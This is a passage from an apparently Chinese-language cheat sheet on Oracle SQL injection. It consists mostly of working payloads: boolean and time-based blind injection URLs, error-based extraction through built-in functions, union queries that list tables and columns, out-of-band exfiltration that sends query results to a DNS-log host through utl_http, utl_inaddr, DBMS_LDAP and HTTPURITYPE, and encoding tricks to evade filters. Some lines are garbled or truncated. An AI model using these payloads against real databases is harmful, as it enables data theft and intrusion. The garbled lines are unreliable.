    SELECT column_name FROM all_tab_columns; 获取字段名
### oracle基本函数
[基本函数](https://www.cnblogs.com/Johnny_Z/archive/2010/10/31/1865673.html)
## Oracle注入
### 常规注入类型
基本类型和mysql其实都差不多
  * 盲注
**1)布尔盲注**
        利用字符串相关函数，对逐个字符进行比较猜解来获取数据
    http://127.0.0.1/oracle?id=99' and (select substr(user, 1, 1) from dual)='O' -- +
    或者利用decode函数+除0(关于decode函数看上面基本函数)
    http://127.0.0.1/oracle?id=99' and 1=(select decode(substr(user, 1, 1), 'O', (1/1),0) from dual) -- +
    或者利用instr函数来进行布尔盲注(从一个字符串中查找指定子串的位置，查询结果中的位置，未找到便返回0，可以通过对子串位置进行遍历和迭代，获取到数据)
    ?username=user'and 1=(instr((select user from dual),'ADMIN')) --
**2)时间盲注**
        利用时间延迟函数配合replace和substr以及decode来进行注入
    select 1 from dual where DBMS_PIPE.RECEIVE_MESSAGE('olo', REPLACE((SELECT substr(user, 1, 1) FROM dual), 'O', 10))=1;
    select decode(substr(user,1,1),'O',dbms_pipe.receive_message('olo',10),0) from dual;
    select 1 from dual where 1=0 or DBMS_PIPE.RECEIVE_MESSAGE('pyy', REPLACE((SELECT substr(user, 1, 1) FROM dual), 'P', 1))=1;
    也可以利用获取大量数据的语句
    select count(*) from all_objects
3) **报错注入**
    * **utl_inaddr.get_host_name**
        在11g之前不需要任何权限，在11g之后当前的数据库用户必须有网络访问权限
    select utl_inaddr.get_host_name((select user from dual)) from dual;
    * **ctxsys.drithsx.sn**
        处理文本的函数，传入参数错误的时会报错返回异常
    select ctxsys.drithsx.sn(1, (select user from dual)) from dual;
    * **CTXSYS.CTX_REPORT.TOKEN_TYPE**
        用于处理文本，也会出现参数错误返回异常
    select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), '123') from dual;
    * **XMLType**
        XMLType是oracle系统定义的数据类型，系统预定义了内部函数去访问XML数据
    select XMLType('') from dual;
    PS：调用的时候必须以结尾，即 '' 或者 chr(60)||balabal||chr(62）;如果返回的数据种有空格的话，会自动截断，导致数据不完整，这种情况下需要先转为 hex，再导出(或者有replace函数替换成其他非空字符)
    * **dbms_xdb_version.checkin**
        select dbms_xdb_version.checkin((select user from dual)) from dual;
    * **dbms_xdb_version.makeversioned**
        select dbms_xdb_version.makeversioned((select user from dual)) from dual;
    * **dbms_xdb_version.uncheckout**
        select dbms_xdb_version.uncheckout((select user from dual)) from dual;
    * **dbms_utility.sqlid_to_sqlhash**
        SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;
    * **ordsys.ord_dicom.getmappingxpath**
        select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;
    * **UTL_INADDR.get_host_name**
        select UTL_INADDR.get_host_name((select user from dual)) from dual;
    * **UTL_INADDR.get_host_address**
        select UTL_INADDR.get_host_name('~'||(select user from dual)||'~') from dual;
  * 联合注入
跟mysql一样利用union拼接select来进行联合注入(步骤也和mysql差不多)
        Tips:Oracle的数据类型是强匹配的，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置，最后查询返回指定的记录时，oracle没有limit函数，要通过'>=00 and r(rownum = 1 and owner <> 'MASTER')
5)注入爆表名
        ?id=99' union select null,null,null,null,(select table_name from user_tables where rownum = 1),null,null,null,null,null from dual --
6)注入爆列
        ?id=99' union select null,null,null,(select column_name from user_tab_columns where table_name='ADMIN' and rownum=1),null,null,null,null,null,null from dual --    改变rownum来注入不同的列
7)最后注入爆数据跟mysql都是一样的，知道表名和列名直接select就行了
### 带外通道(OOB：Out Of Band Channels)
`OOB`(带外通道)：使用一些除常规通道以外的替代的信道来请求服务器资源，一般使用 Oracle
发送`HTTP`或者`DNS`请求，将查询结果带到请求中，然后监测外网服务器的`HTTP`和`DNS`日志，从日志中获取 sql
语句查询的结果，通过这种方式将繁琐的盲注转换成可以直接简便的获取查询结果的方式，尤其是基于时间的盲注，能极大地加快速度；类似于sql注入中的使用load_file带外盲注
所以使用OOB需要有发起网络请求的权限
  * **utl_http.request**
    utl_http.request向外网主机发送http请求，需要出外网http
    select utl_http.request('dnslog'||(select user from dual)) from dual;
  * **utl_inaddr.get_host_address**
    dns解析带外
    把查询结果拼接到域名下，并使用DNS记录解析日志，通过这种方式获取查询结果
    select utl_inaddr.get_host_address((select user from dual)||'dnslog') from dual
  * **SYS.DBMS_LDAP.INIT**
    在oracle10g和11g里面只需要public权限
    SELECT DBMS_LDAP.INIT((‘dnslog',80) FROM DUAL;
  * **HTTPURITYPE**
    HTTPURITYPE根据给定的URI创建一个实例
    SELECT HTTPURITYPE((select user from dual)||'dnslog').GETCLOB() FROM DUAL;
Oracle <= 10g
    以下模块都可用于发起网络请求
    UTL_INADDR.GET_HOST_ADDRESS
    UTL_HTTP.REQUEST
    HTTP_URITYPE.GETCLOB
    DBMS_LDAP.INIT and UTL_TCP
## Oracle绕过技巧
  * 使用hextoraw()及asciistr()搭配UTL_RAW.CAST_TO_VARCHAR2()函数来进行ascii的编码
    hextoraw()：十六进制字符串转换为raw
    SELECT UTL_RAW.CAST_TO_VARCHAR2(hextoraw("abcdef")) FROM dual
使用rawtohex()来进行ascii的解码
    SELECT rawtohex('abcdef') FROM dual
下面是一些利用编码绕过的情况
    SELECT 1 FROM dual;             正常语句
    SELECT%0a1%0aFROM%0adual;       \n换行来替代空格
    SELECT%0b1%0bFROM%0bdual;        使用tab来替换空格
    SELECT%0c1%0cFROM%0cdual;        使用\r回车开替换空格
    SELECT/**/1/**/FROM/**/dual;     多行注释符来替代回车
    SELECT--%0a1--%0aFROM--%0adual;  单行注释符和换行来替代回车
    SELECT/*!12321SELECT*/1/*!12321AND*/FROM/*!12321QWE*/dual; 使用内联注释符